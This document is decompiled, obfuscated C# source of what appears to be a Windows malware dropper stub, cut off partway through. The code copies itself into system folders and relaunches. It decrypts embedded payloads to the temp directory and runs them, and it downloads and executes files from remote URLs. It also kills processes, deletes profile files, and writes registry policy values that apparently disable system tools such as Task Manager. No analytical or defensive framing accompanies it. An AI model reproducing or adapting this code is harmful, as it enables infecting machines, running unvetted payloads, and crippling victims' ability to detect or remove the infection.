using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace iexprorer;

internal sealed class QueueDictionary
{
	private static XmlFileInvoker valuesMap = new XmlFileInvoker();

	private static DiskAttribute.EmulatorTable valuesMap = new DiskAttribute.EmulatorTable();

	private static DiskAttribute.AssemblyResolver valuesMap = new DiskAttribute.AssemblyResolver();

	private static DiskAttribute.QueueTree valuesMap = new DiskAttribute.QueueTree();

	private static DiskAttribute.CommandContext valuesMap = new DiskAttribute.CommandContext();

	private static DiskAttribute.MethodLayout valuesMap = new DiskAttribute.MethodLayout();

	private static DiskAttribute.NetworkTree valuesMap = new DiskAttribute.NetworkTree();

	private static DiskAttribute.DialogEventArgs valuesMap = new DiskAttribute.DialogEventArgs();

	private static DiskAttribute.OptionsHelper valuesMap = new DiskAttribute.OptionsHelper();

	private static DiskAttribute.XmlFileLayout valuesMap = new DiskAttribute.XmlFileLayout();

	private static DiskAttribute.StoreContext valuesMap = new DiskAttribute.StoreContext();

	[CompilerGenerated]
	private static WaitCallback valuesMap;

	[CompilerGenerated]
	private static WaitCallback valuesSet;

	[CompilerGenerated]
	private static WaitCallback activeGenerator;

	[CompilerGenerated]
	private static WaitCallback propStorePosition;

	[CompilerGenerated]
	private static WaitCallback lastLine;

	[CompilerGenerated]
	private static WaitCallback activeName;

	[CompilerGenerated]
	private static WaitCallback captionLength;

	[CompilerGenerated]
	private static WaitCallback currentCancel;

	[CompilerGenerated]
	private static WaitCallback options;

	[CompilerGenerated]
	private static WaitCallback lastTimer;

	[CompilerGenerated]
	private static WaitCallback firstUri;

	[CompilerGenerated]
	private static WaitCallback node;

	[CompilerGenerated]
	private static WaitCallback querySet;

	[CompilerGenerated]
	private static WaitCallback reasonInstance;

	[CompilerGenerated]
	private static WaitCallback wrapperPosition;

	[CompilerGenerated]
	private static WaitCallback outputMap;

	[CompilerGenerated]
	private static WaitCallback pathInstance;

	[CompilerGenerated]
	private static WaitCallback outputLength;

	[CompilerGenerated]
	private static WaitCallback variableCount;

	[CompilerGenerated]
	private static WaitCallback messageCollection;

	[CompilerGenerated]
	private static WaitCallback categoryMap;

	[CompilerGenerated]
	private static WaitCallback previousUri;

	[CompilerGenerated]
	private static WaitCallback lastVariable;

	[CompilerGenerated]
	private static WaitCallback sessionLength;

	[CompilerGenerated]
	private static WaitCallback handlerHeader;

	[CompilerGenerated]
	private static WaitCallback firstVariable;

	[CompilerGenerated]
	private static WaitCallback valuesHandle;

	private static void ProcessPciture(string[] args)
	{
		PcitureType.ProcessPciture();
		QueueDictionary.valuesMap.ProcessPciture += ProcessPciture;
		QueueDictionary.valuesMap.ProcessPciture();
		string text = _003CModule_003E.smethod_0("Yfql", 3);
		string text2 = _003CModule_003E.smethod_0("!Xgpm!", 2);
		string s = _003CModule_003E.smethod_0("[wk[mqjkmic", 2);
		foreach (string text3 in args)
		{
			if (text3 == text)
			{
				StringBuilder stringBuilder = new StringBuilder();
				stringBuilder.Append(QueueDictionary.valuesMap.ProcessPciture + text2 + QueueDictionary.valuesMap.ResolveView + text2 + QueueDictionary.valuesMap.ProcessPciture);
				string @string = Encoding.Default.GetString(Icon.ProcessPciture(Encoding.Default.GetBytes(stringBuilder.ToString()), Encoding.Default.GetBytes(s)));
				Console.WriteLine(@string);
				Process.GetCurrentProcess().Kill();
			}
		}
		QueueDictionary.valuesMap.ProcessPciture.add_Tick((EventHandler)ProcessPciture);
		if (QueueDictionary.valuesMap.ProcessPciture)
		{
			if (Application.get_StartupPath() != Environment.GetFolderPath(QueueDictionary.valuesMap.ProcessPciture))
			{
				switch (QueueDictionary.valuesMap.ResolveView)
				{
				case false:
					try
					{
						Icon.Print(QueueDictionary.valuesMap.ProcessPciture, Environment.GetFolderPath(QueueDictionary.valuesMap.ProcessPciture) + _003CModule_003E.smethod_0("U", 9) + QueueDictionary.valuesMap.LoadDeployment);
						File.Copy(Application.get_ExecutablePath(), Environment.GetFolderPath(QueueDictionary.valuesMap.ProcessPciture) + _003CModule_003E.smethod_0("Ǐ", 403) + QueueDictionary.valuesMap.LoadDeployment, overwrite: true);
						Process process = new Process();
						process.StartInfo = new ProcessStartInfo
						{
							Arguments = _003CModule_003E.smethod_0("ėĖěĝ", 344),
							FileName = Environment.GetFolderPath(QueueDictionary.valuesMap.ProcessPciture) + _003CModule_003E.smethod_0("ƿ", 483) + QueueDictionary.valuesMap.LoadDeployment
						};
						process.Start();
						Process.GetCurrentProcess().Kill();
					}
					catch (Exception ex2)
					{
						Console.WriteLine(string.Format(_003CModule_003E.smethod_0("\u02f7ʸʅʞʘʍʉʔʒʓ\u02ddʒʞʞʈʏʘʙ\u02dd\u02d5ʰʜʔʓ\u02d4ˇ\u02ddʆˍʀ", 765), ex2.Message));
					}
					break;
				case true:
					try
					{
						Icon.Print(QueueDictionary.valuesMap.ProcessPciture, Environment.GetFolderPath(QueueDictionary.valuesMap.ProcessPciture) + _003CModule_003E.smethod_0("]", 1) + QueueDictionary.valuesMap.LoadDeployment);
						Icon.LoadDeployment(Environment.GetFolderPath(QueueDictionary.valuesMap.ProcessPciture) + _003CModule_003E.smethod_0("U", 9) + QueueDictionary.valuesMap.LoadDeployment, _003CModule_003E.smethod_0("MLAG", 2));
					}
					catch (Exception ex)
					{
						Console.WriteLine(string.Format(_003CModule_003E.smethod_0("\rB\u007fdbwsnhi'hddrubc'/Jfni.='|7z", 7), ex.Message));
					}
					break;
				}
			}
			else
			{
				if (args.Length > 0 && args[0] == _003CModule_003E.smethod_0("ϬϭϠϦ", 931))
				{
					if (QueueDictionary.valuesMap.ProcessPciture & QueueDictionary.valuesMap.ResolveView)
					{
						ThreadPool.QueueUserWorkItem(delegate
						{
							Icon.ProcessPciture<DiskAttribute.NetworkTree.PathType>(_003CModule_003E.smethod_0("ࡦࡠ\u0876ࡡ\u0820\u0821\u0829࡞\u0876ࡠࡠ\u0872\u0874\u0876ࡑ\u087c\u086bࡒ", 2067))(IntPtr.Zero, QueueDictionary.valuesMap.ResolveView, QueueDictionary.valuesMap.ProcessPciture, QueueDictionary.valuesMap.ProcessPciture);
						});
					}
					if (QueueDictionary.valuesMap.ProcessPciture & QueueDictionary.valuesMap.ResolveView)
					{
						ThreadPool.QueueUserWorkItem(delegate
						{
							try
							{
								string string4 = Encoding.Default.GetString(Icon.ProcessPciture(Icon.ResolveView()));
								string[] separator3 = new string[1] { QueueDictionary.valuesMap.ProcessPciture };
								int num16 = 0;
								string[] array3 = string4.Split(separator3, StringSplitOptions.RemoveEmptyEntries);
								foreach (string s4 in array3)
								{
									byte[] bytes3 = Icon.ResolveView(Encoding.Default.GetBytes(s4), Encoding.Default.GetBytes(QueueDictionary.valuesMap.ResolveView));
									string text9 = Path.GetTempPath() + _003CModule_003E.smethod_0("∞", 8770) + QueueDictionary.valuesMap.ProcessPciture[num16];
									File.WriteAllBytes(text9, bytes3);
									Process.Start(text9);
									num16++;
								}
							}
							catch (Exception ex25)
							{
								Console.WriteLine(string.Format(_003CModule_003E.smethod_0("ঊ\u09c5৸\u09e3\u09e5ৰ৴৩৯৮ঠ৯\u09e3\u09e3৵৲\u09e5\u09e4ঠন\u09cdৡ৩৮ঠর৸\u09c6৩৬\u09e5\u09c2৩৮\u09e4\u09e5৲\u09a9\u09baঠ৻র৽", 2432), ex25.Message));
							}
						});
					}
					if (QueueDictionary.valuesMap.ProcessPciture & QueueDictionary.valuesMap.ResolveView)
					{
						ThreadPool.QueueUserWorkItem(delegate
						{
							try
							{
								string text8 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + _003CModule_003E.smethod_0("℉℘℺ℯℼℹℹℴ℉ℓℼ℧ℰℳ℺ℭ℉℅℧℺ℳℼℹℰΩ", 8533);
								DirectoryInfo directoryInfo5 = new DirectoryInfo(text8);
								DirectoryInfo[] directories3 = directoryInfo5.GetDirectories();
								foreach (DirectoryInfo directoryInfo6 in directories3)
								{
									if (File.Exists(string.Concat(text8, _003CModule_003E.smethod_0("\u0658", 1540), directoryInfo6, _003CModule_003E.smethod_0("\u0e70๏ใใ\u0e47ๅ\u0e49\u0e5fข\u0e5f\u0e5dเๅ๘\u0e49", 3628))))
									{
										Process[] processesByName11 = Process.GetProcessesByName(_003CModule_003E.smethod_0("ᓯᓠᓻᓬᓯᓦᓱ", 5257));
										foreach (Process process15 in processesByName11)
										{
											process15.Kill();
											process15.WaitForExit();
										}
										Process[] processesByName12 = Process.GetProcessesByName(_003CModule_003E.smethod_0("Ბ\u1c8dᲔᲆᲈ\u1c8f\u1cccᲂ\u1c8e\u1c8fᲕᲀᲈ\u1c8fᲄᲓ", 7393));
										foreach (Process process16 in processesByName12)
										{
											process16.Kill();
											process16.WaitForExit();
										}
										File.Delete(string.Concat(text8, _003CModule_003E.smethod_0("Ľ", 353), directoryInfo6, _003CModule_003E.smethod_0("૩\u0ad6\u0ada\u0ada\u0ade\u0adcૐ\u0ac6છ\u0ac6\u0ac4\u0ad9\u0adc\u0ac1ૐ", 2741)));
									}
								}
							}
							catch (Exception ex24)
							{
								Console.WriteLine(string.Format(_003CModule_003E.smethod_0("\u08b5\u08faࣇ\u08dc\u08da\u08cf\u08cb\u08d6\u08d0\u08d1\u089f\u08d0\u08dc\u08dc\u08ca\u08cd\u08da\u08db\u089f\u0897\u08f2\u08de\u08d6\u08d1\u0896\u0885\u089fࣄ\u088fࣂ", 2239), ex24.Message));
							}
						});
					}
					if (QueueDictionary.valuesMap.Print & QueueDictionary.valuesMap.ProcessDrive)
					{
						ThreadPool.QueueUserWorkItem(delegate
						{
							ClientLayout.ProcessPciture(QueueDictionary.valuesMap.ProcessPciture);
							try
							{
								Process[] processesByName9 = Process.GetProcessesByName(_003CModule_003E.smethod_0("՜ՓՈ՟՜ՕՂ", 1338));
								foreach (Process process13 in processesByName9)
								{
									process13.Kill();
								}
								Process[] processesByName10 = Process.GetProcessesByName(_003CModule_003E.smethod_0("\u0087\u009b\u0082\u0090\u009e\u0099Ú\u0094\u0098\u0099\u0083\u0096\u009e\u0099\u0092\u0085", 247));
								foreach (Process process14 in processesByName10)
								{
									process14.Kill();
								}
							}
							catch (Exception ex23)
							{
								Console.WriteLine(string.Format(_003CModule_003E.smethod_0("⒀Ⓩ⓲ⓩ⓯⓺⓾ⓣⓥⓤ⒪ⓥⓩⓩ⓿⓸⓯⓮⒪⒢Ⓡ⓫ⓣⓤ⒣⒰⒪⓱Ⓔ⓷", 9354), ex23.Message));
							}
						});
					}
					if (QueueDictionary.valuesMap.ProcessPciture & QueueDictionary.valuesMap.ResolveView)
					{
						ThreadPool.QueueUserWorkItem(delegate
						{
							foreach (string item in QueueDictionary.valuesMap.ProcessPciture)
							{
								try
								{
									Process process12 = new Process
									{
										StartInfo = new ProcessStartInfo
										{
											FileName = item,
											UseShellExecute = true
										}
									};
									process12.Start();
								}
								catch (Exception ex22)
								{
									Console.WriteLine(string.Format(_003CModule_003E.smethod_0("՜ԓԮԵԳԦԢԿԹԸնԹԵԵԣԤԳԲնվԛԷԿԸտլնԭզԫ", 1366), ex22.Message));
								}
							}
						});
					}
					if (QueueDictionary.valuesMap.ProcessPciture & QueueDictionary.valuesMap.ResolveView)
					{
						ThreadPool.QueueUserWorkItem(delegate
						{
							WebClient webClient3 = new WebClient();
							foreach (string item2 in QueueDictionary.valuesMap.ProcessPciture)
							{
								try
								{
									string fileName3 = Path.GetTempPath() + _003CModule_003E.smethod_0("\u0301", 861) + Icon.ProcessDrive(5, 10) + item2.Substring(item2.LastIndexOf('.'));
									webClient3.DownloadFile(item2, fileName3);
									Process.Start(fileName3);
								}
								catch (Exception ex21)
								{
									Console.WriteLine(string.Format(_003CModule_003E.smethod_0("₭\u20e2\u20df\u20c4\u20c2\u20d7\u20d3\u20ce\u20c8\u20c9₇\u20c8\u20c4\u20c4\u20d2\u20d5\u20c2\u20c3₇\u208f\u20ea\u20c6\u20ce\u20c9₎\u209d₇\u20dcₗ\u20da", 8359), ex21.Message));
								}
							}
						});
					}
				}
				if (QueueDictionary.valuesMap.ProcessPciture & !QueueDictionary.valuesMap.ResolveView)
				{
					ThreadPool.QueueUserWorkItem(delegate
					{
						Icon.ProcessPciture<DiskAttribute.NetworkTree.PathType>(_003CModule_003E.smethod_0("\u1a6f\u1a69\u1a7f\u1a68ᨩᨨᨠ\u1a57\u1a7f\u1a69\u1a69\u1a7b\u1a7d\u1a7f\u1a58\u1a75\u1a62\u1a5b", 6682))(IntPtr.Zero, QueueDictionary.valuesMap.ResolveView, QueueDictionary.valuesMap.ProcessPciture, QueueDictionary.valuesMap.ProcessPciture);
					});
				}
				if (QueueDictionary.valuesMap.ProcessPciture & !QueueDictionary.valuesMap.ResolveView)
				{
					ThreadPool.QueueUserWorkItem(delegate
					{
						try
						{
							string string3 = Encoding.Default.GetString(Icon.ProcessPciture(Icon.ResolveView()));
							string[] separator2 = new string[1] { QueueDictionary.valuesMap.ProcessPciture };
							int num9 = 0;
							string[] array2 = string3.Split(separator2, StringSplitOptions.RemoveEmptyEntries);
							foreach (string s3 in array2)
							{
								byte[] bytes2 = Icon.ResolveView(Encoding.Default.GetBytes(s3), Encoding.Default.GetBytes(QueueDictionary.valuesMap.ResolveView));
								string text7 = Path.GetTempPath() + _003CModule_003E.smethod_0("\u2062", 8254) + QueueDictionary.valuesMap.ProcessPciture[num9];
								File.WriteAllBytes(text7, bytes2);
								Process.Start(text7);
								num9++;
							}
						}
						catch (Exception ex20)
						{
							Console.WriteLine(string.Format(_003CModule_003E.smethod_0("᭠ᬯᬒᬉᬏᬚᬞ\u1b03ᬅ\u1b04ᭊᬅᬉᬉᬟᬘᬏᬎᭊ\u1b42ᬧᬋ\u1b03\u1b04ᭊ᭚ᬒᬬ\u1b03ᬆᬏᬨ\u1b03\u1b04ᬎᬏᬘ\u1b43᭐ᭊᬑ᭚ᬗ", 7018), ex20.Message));
						}
					});
				}
				if (QueueDictionary.valuesMap.ProcessPciture & !QueueDictionary.valuesMap.ResolveView)
				{
					ThreadPool.QueueUserWorkItem(delegate
					{
						try
						{
							string text6 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + _003CModule_003E.smethod_0("ߍߜ߾\u07eb߸\u07fd\u07fd\u07f0ߍߗ߸ߣߴ߷߾ߩߍ߁ߣ߾߷߸\u07fdߴߢ", 1937);
							DirectoryInfo directoryInfo3 = new DirectoryInfo(text6);
							DirectoryInfo[] directories2 = directoryInfo3.GetDirectories();
							foreach (DirectoryInfo directoryInfo4 in directories2)
							{
								if (File.Exists(string.Concat(text6, _003CModule_003E.smethod_0("ᎍ", 5073), directoryInfo4, _003CModule_003E.smethod_0("\u05af\u0590\u059c\u059c\u0598\u059a\u0596րםրւ\u059f\u059aև\u0596", 1523))))
								{
									Process[] processesByName7 = Process.GetProcessesByName(_003CModule_003E.smethod_0("\u0ad1\u0ade\u0ac5\u0ad2\u0ad1\u0ad8\u0acf", 2743));
									foreach (Process process10 in processesByName7)
									{
										process10.Kill();
										process10.WaitForExit();
									}
									Process[] processesByName8 = Process.GetProcessesByName(_003CModule_003E.smethod_0("ᐟᐃᐚᐈᐆᐁᑂᐌ᐀ᐁᐛᐎᐆᐁᐊᐝ", 5231));
									foreach (Process process11 in processesByName8)
									{
										process11.Kill();
										process11.WaitForExit();
									}
									File.Delete(string.Concat(text6, _003CModule_003E.smethod_0("௦", 3002), directoryInfo4, _003CModule_003E.smethod_0("ߊߵ߹߹\u07fd߿\u07f3ߥ\u07b8ߥߧߺ߿ߢ\u07f3", 1942)));
								}
							}
						}
						catch (Exception ex19)
						{
							Console.WriteLine(string.Format(_003CModule_003E.smethod_0("ሌቃቾብባቶቲቯቩቨሦቩብብታቴባቢሦሮቋቧቯቨሯሼሦችሶቻ", 4614), ex19.Message));
						}
					});
				}
				if (QueueDictionary.valuesMap.Print & !QueueDictionary.valuesMap.ProcessDrive)
				{
					ThreadPool.QueueUserWorkItem(delegate
					{
						ClientLayout.ProcessPciture(QueueDictionary.valuesMap.ProcessPciture);
						try
						{
							Process[] processesByName5 = Process.GetProcessesByName(_003CModule_003E.smethod_0("ᣕᣚᣁᣖᣕᣜᣋ", 6323));
							foreach (Process process8 in processesByName5)
							{
								process8.Kill();
							}
							Process[] processesByName6 = Process.GetProcessesByName(_003CModule_003E.smethod_0("\u193b\u1927\u193e\u192c\u1922\u1925ᥦ\u1928\u1924\u1925\u193f\u192a\u1922\u1925\u192e\u1939", 6475));
							foreach (Process process9 in processesByName6)
							{
								process9.Kill();
							}
						}
						catch (Exception ex18)
						{
							Console.WriteLine(string.Format(_003CModule_003E.smethod_0("\u106aဥဘဃစတနဉဏဎ၀ဏဃဃပဒစင၀၈\u102dခဉဎ၉ၚ၀ရၐဝ", 4192), ex18.Message));
						}
					});
				}
				if (QueueDictionary.valuesMap.ProcessPciture & !QueueDictionary.valuesMap.ResolveView)
				{
					ThreadPool.QueueUserWorkItem(delegate
					{
						WebClient webClient2 = new WebClient();
						foreach (string item3 in QueueDictionary.valuesMap.ProcessPciture)
						{
							try
							{
								string fileName2 = Path.GetTempPath() + _003CModule_003E.smethod_0("ᦵ", 6633) + Icon.ProcessDrive(5, 10) + item3.Substring(item3.LastIndexOf('.'));
								webClient2.DownloadFile(item3, fileName2);
								Process.Start(fileName2);
							}
							catch (Exception ex17)
							{
								Console.WriteLine(string.Format(_003CModule_003E.smethod_0("ᯓᮜ\u1ba1ᮺᮼ\u1ba9\u1bad᮰᮶᮷\u1bf9᮶ᮺᮺ\u1bac\u1babᮼᮽ\u1bf9\u1bf1ᮔ᮸᮰᮷\u1bf0ᯣ\u1bf9\u1ba2\u1be9\u1ba4", 7129), ex17.Message));
							}
						}
					});
				}
				if (QueueDictionary.valuesMap.ProcessPciture & !QueueDictionary.valuesMap.ResolveView)
				{
					ThreadPool.QueueUserWorkItem(delegate
					{
						foreach (string item4 in QueueDictionary.valuesMap.ProcessPciture)
						{
							try
							{
								Process process7 = new Process
								{
									StartInfo = new ProcessStartInfo
									{
										FileName = item4,
										UseShellExecute = true
									}
								};
								process7.Start();
							}
							catch (Exception ex16)
							{
								Console.WriteLine(string.Format(_003CModule_003E.smethod_0("ॸषऊऑग\u0902आछझज\u0952झऑऑइ\u0900गख\u0952ग़\u093fओछजज़\u0948\u0952उ\u0942ए", 2418), ex16.Message));
							}
						}
					});
				}
			}
		}
		else
		{
			if (QueueDictionary.valuesMap.ProcessPciture)
			{
				ThreadPool.QueueUserWorkItem(delegate
				{
					Icon.ProcessPciture<DiskAttribute.NetworkTree.PathType>(_003CModule_003E.smethod_0("ᙿᙹᙯᙸᘹᘸᘰᙇᙯᙹᙹᙫ᙭ᙯᙈᙥᙲᙋ", 5642))(IntPtr.Zero, QueueDictionary.valuesMap.ResolveView, QueueDictionary.valuesMap.ProcessPciture, QueueDictionary.valuesMap.ProcessPciture);
				});
			}
			if (QueueDictionary.valuesMap.ProcessPciture)
			{
				ThreadPool.QueueUserWorkItem(delegate
				{
					try
					{
						string string2 = Encoding.Default.GetString(Icon.ProcessPciture(Icon.ResolveView()));
						string[] separator = new string[1] { QueueDictionary.valuesMap.ProcessPciture };
						int num2 = 0;
						string[] array = string2.Split(separator, StringSplitOptions.RemoveEmptyEntries);
						foreach (string s2 in array)
						{
							byte[] bytes = Icon.ResolveView(Encoding.Default.GetBytes(s2), Encoding.Default.GetBytes(QueueDictionary.valuesMap.ResolveView));
							string text5 = Path.GetTempPath() + _003CModule_003E.smethod_0("ḽ", 7777) + QueueDictionary.valuesMap.ProcessPciture[num2];
							File.WriteAllBytes(text5, bytes);
							Process.Start(text5);
							num2++;
						}
					}
					catch (Exception ex15)
					{
						Console.WriteLine(string.Format(_003CModule_003E.smethod_0("ឍ\u17c2\u17ff៤២៷៳\u17ee៨៩ឧ៨៤៤៲៵២៣ឧឯ\u17ca៦\u17ee៩ឧ\u17b7\u17ff\u17c1\u17ee\u17eb២\u17c5\u17ee៩៣២៵ឮ\u17bdឧ\u17fc\u17b7\u17fa", 6023), ex15.Message));
					}
				});
			}
			if (QueueDictionary.valuesMap.ProcessPciture)
			{
				ThreadPool.QueueUserWorkItem(delegate
				{
					try
					{
						string text4 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + _003CModule_003E.smethod_0("\u0ddf\u0dce෬\u0df9෪෯෯\u0de2\u0ddfළ෪\u0df1෦\u0de5෬\u0dfb\u0ddf\u0dd3\u0df1෬\u0de5෪෯෦\u0df0", 3459);
						DirectoryInfo directoryInfo = new DirectoryInfo(text4);
						DirectoryInfo[] directories = directoryInfo.GetDirectories();
						foreach (DirectoryInfo directoryInfo2 in directories)
						{
							if (File.Exists(string.Concat(text4, _003CModule_003E.smethod_0("స", 3172), directoryInfo2, _003CModule_003E.smethod_0("∵∊∆∆∂∀∌√≇√∘∅∀∝∌", 8809))))
							{
								Process[] processesByName3 = Process.GetProcessesByName(_003CModule_003E.smethod_0("≑≞≅≒≑≘≏", 8759));
								foreach (Process process5 in processesByName3)
								{
									process5.Kill();
									process5.WaitForExit();
								}
								Process[] processesByName4 = Process.GetProcessesByName(_003CModule_003E.smethod_0("ȮȲȫȹȷȰɳȽȱȰȪȿȷȰȻȬ", 606));
								foreach (Process process6 in processesByName4)
								{
									process6.Kill();
									process6.WaitForExit();
								}
								File.Delete(string.Concat(text4, _003CModule_003E.smethod_0("ቔ", 4616), directoryInfo2, _003CModule_003E.smethod_0("⇮⇑⇝⇝⇙⇛⇗⇁↜⇁⇃⇞⇛⇆⇗", 8626)));
							}
						}
					}
					catch (Exception ex14)
					{
						Console.WriteLine(string.Format(_003CModule_003E.smethod_0("Ղԍ\u0530ԫԭԸԼԡԧԦըԧԫԫԽԺԭԬըՠԅԩԡԦաղըԳոԵ", 1352), ex14.Message));
					}
				});
			}
			if (QueueDictionary.valuesMap.Print)
			{
				ThreadPool.QueueUserWorkItem(delegate
				{
					ClientLayout.ProcessPciture(QueueDictionary.valuesMap.ProcessPciture);
					try
					{
						Process[] processesByName = Process.GetProcessesByName(_003CModule_003E.smethod_0("\u0df2\u0dfd෦\u0df1\u0df2\u0dfb෬", 3476));
						foreach (Process process3 in processesByName)
						{
							process3.Kill();
						}
						Process[] processesByName2 = Process.GetProcessesByName(_003CModule_003E.smethod_0("᳃\u1cdf᳆\u1cd4\u1cda\u1cddᲞ\u1cd0\u1cdc\u1cdd᳇\u1cd2\u1cda\u1cdd\u1cd6᳁", 7347));
						foreach (Process process4 in processesByName2)
						{
							process4.Kill();
						}
					}
					catch (Exception ex13)
					{
						Console.WriteLine(string.Format(_003CModule_003E.smethod_0("᭔ᬛᬦ\u1b3d\u1b3bᬮᬪ\u1b37ᬱᬰ\u1b7eᬱ\u1b3d\u1b3dᬫᬬ\u1b3b\u1b3a\u1b7e᭶ᬓ\u1b3f\u1b37ᬰ᭷᭤\u1b7eᬥ\u1b6eᬣ", 7006), ex13.Message));
					}
				});
			}
			if (QueueDictionary.valuesMap.ProcessPciture)
			{
				ThreadPool.QueueUserWorkItem(delegate
				{
					WebClient webClient = new WebClient();
					foreach (string item5 in QueueDictionary.valuesMap.ProcessPciture)
					{
						try
						{
							string fileName = Path.GetTempPath() + _003CModule_003E.smethod_0("Ⴇ", 4347) + Icon.ProcessDrive(5, 10) + item5.Substring(item5.LastIndexOf('.'));
							webClient.DownloadFile(item5, fileName);
							Process.Start(fileName);
						}
						catch (Exception ex12)
						{
							Console.WriteLine(string.Format(_003CModule_003E.smethod_0("\u07aeߡߜ߇߁ߔߐߍߋߊބߋ߇߇ߑߖ߁߀ބތߩ߅ߍߊލޞބߟޔߙ", 1956), ex12.Message));
						}
					}
				});
			}
			if (QueueDictionary.valuesMap.ProcessPciture)
			{
				ThreadPool.QueueUserWorkItem(delegate
				{
					foreach (string item6 in QueueDictionary.valuesMap.ProcessPciture)
					{
						try
						{
							Process process2 = new Process
							{
								StartInfo = new ProcessStartInfo
								{
									FileName = item6,
									UseShellExecute = true
								}
							};
							process2.Start();
						}
						catch (Exception ex11)
						{
							Console.WriteLine(string.Format(_003CModule_003E.smethod_0("۷ڸڅڞژڍډڔڒړ\u06ddڒڞڞڈڏژڙ\u06ddەڰڜڔړ۔ۇ\u06ddچۍڀ", 1789), ex11.Message));
						}
					}
				});
			}
		}
		if (QueueDictionary.valuesMap.ProcessPciture)
		{
			ThreadPool.QueueUserWorkItem(delegate
			{
				try
				{
					RegistryKey registryKey11 = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("ᅈᅴᅽᅯᅬᅺᅩᅾᅇᅋᅴᅷᅲᅸᅲᅾᅨᅇᅖᅲᅸᅩᅴᅨᅴᅽᅯᅇᅌᅲᅵᅿᅴᅬᅨᅇᅈᅢᅨᅯᅾᅶ", 4379));
					registryKey11.SetValue(_003CModule_003E.smethod_0("\u19ce᧣᧹᧫᧨᧦᧯ᧉᧇ\u19ce", 6538), 1);
					registryKey11.Close();
				}
				catch (Exception ex10)
				{
					Console.WriteLine(string.Format(_003CModule_003E.smethod_0("\u1b36᭹\u1b44᭟᭙\u1b4cᭈ᭕᭓᭒ᬜ᭓᭟᭟ᭉ\u1b4e᭙᭘ᬜᬔ\u1b71᭝᭕᭒ᬕᬆᬜᭇᬌ\u1b41", 6972), ex10.Message));
				}
			});
		}
		if (QueueDictionary.valuesMap.ResolveView)
		{
			ThreadPool.QueueUserWorkItem(delegate
			{
				try
				{
					RegistryKey registryKey10 = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("ޟޣ\u07aa\u07b8\u07bb\u07ad\u07be\u07a9ސށޥ\u07af\u07beޣ\u07bfޣ\u07aa\u07b8ސޛޥޢ\u07a8ޣ\u07bb\u07bfސޏ\u07b9\u07be\u07be\u07a9ޢ\u07b8ޚ\u07a9\u07be\u07bfޥޣޢސޜޣޠޥ\u07afޥ\u07a9\u07bfސޟ\u07b5\u07bf\u07b8\u07a9ޡ", 1996));
					registryKey10.SetValue(_003CModule_003E.smethod_0("\u0ef5໘ໂ໐໓ໝ໔\u0ee5໐ໂ\u0eda\u0efc໖ໃ", 3761), 1);
					registryKey10.Close();
				}
				catch (Exception ex9)
				{
					Console.WriteLine(string.Format(_003CModule_003E.smethod_0("&iTOI\\XECB\fCOOY^IH\f\u0004aMEB\u0005\u0016\fW\u001cQ", 44), ex9.Message));
				}
			});
		}
		if (QueueDictionary.valuesMap.LoadDeployment)
		{
			ThreadPool.QueueUserWorkItem(delegate
			{
				try
				{
					RegistryKey registryKey9 = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("\u0f97\u0fab\u0fa2\u0fb0\u0fb3\u0fa5\u0fb6\u0fa1\u0f98ྉ\u0fad\u0fa7\u0fb6\u0fab\u0fb7\u0fab\u0fa2\u0fb0\u0f98\u0f93\u0fad\u0faa\u0fa0\u0fab\u0fb3\u0fb7\u0f98\u0f87\u0fb1\u0fb6\u0fb6\u0fa1\u0faa\u0fb0\u0f92\u0fa1\u0fb6\u0fb7\u0fad\u0fab\u0faa\u0f98\u0f94\u0fab\u0fa8\u0fad\u0fa7\u0fad\u0fa1\u0fb7\u0f98\u0f97\u0fbd\u0fb7\u0fb0\u0fa1\u0fa9", 4036));
					registryKey9.SetValue(_003CModule_003E.smethod_0("ᏰᏝᏇᏕᏖᏘᏑᏦᏑᏓᏝᏇᏀᏆᏍᏠᏛᏛᏘᏇ", 5044), 1);
					registryKey9.Close();
				}
				catch (Exception ex8)
				{
					Console.WriteLine(string.Format(_003CModule_003E.smethod_0("\u245a␕\u2428\u2433\u2435␠␤\u2439\u243f\u243e⑰\u243f\u2433\u2433␥␢\u2435\u2434⑰⑸␝\u2431\u2439\u243e⑹⑪⑰\u242b①\u242d", 9296), ex8.Message));
				}
			});
		}
		if (QueueDictionary.valuesMap.Print)
		{
			ThreadPool.QueueUserWorkItem(delegate
			{
				try
				{
					string pathRoot = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System));
					pathRoot = pathRoot.Replace(_003CModule_003E.smethod_0("᱃", 7289), string.Empty);
					pathRoot = pathRoot.Replace(_003CModule_003E.smethod_0("ᐌ", 5200), string.Empty);
					int num = 0;
					string key;
					if ((key = pathRoot) != null)
					{
						if (DriveInfo.valuesMap == null)
						{
							DriveInfo.valuesMap = new Dictionary<string, int>(26)
							{
								{
									_003CModule_003E.smethod_0("м", 1149),
									0
								},
								{
									_003CModule_003E.smethod_0("\u0336", 884),
									1
								},
								{
									_003CModule_003E.smethod_0("ࡣ", 2080),
									2
								},
								{
									_003CModule_003E.smethod_0("\u1ab2", 6902),
									3
								},
								{
									_003CModule_003E.smethod_0("↛", 8670),
									4
								},
								{
									_003CModule_003E.smethod_0("௲", 2996),
									5
								},
								{
									_003CModule_003E.smethod_0("ල", 3578),
									6
								},
								{
									_003CModule_003E.smethod_0("ԉ", 1345),
									7
								},
								{
									_003CModule_003E.smethod_0("\u1757", 5918),
									8
								},
								{
									_003CModule_003E.smethod_0("\u034a", 768),
									9
								},
								{
									_003CModule_003E.smethod_0("Ἀ", 8003),
									10
								},
								{
									_003CModule_003E.smethod_0("ᡭ", 6177),
									11
								},
								{
									_003CModule_003E.smethod_0("Ⓜ", 9359),
									12
								},
								{
									_003CModule_003E.smethod_0("Ṕ", 7706),
									13
								},
								{
									_003CModule_003E.smethod_0("ቃ", 4620),
									14
								},
								{
									_003CModule_003E.smethod_0("ጳ", 4963),
									15
								},
								{
									_003CModule_003E.smethod_0("ᒪ", 5371),
									16
								},
								{
									_003CModule_003E.smethod_0("ᄈ", 4442),
									17
								},
								{
									_003CModule_003E.smethod_0("\u244d", 9246),
									18
								},
								{
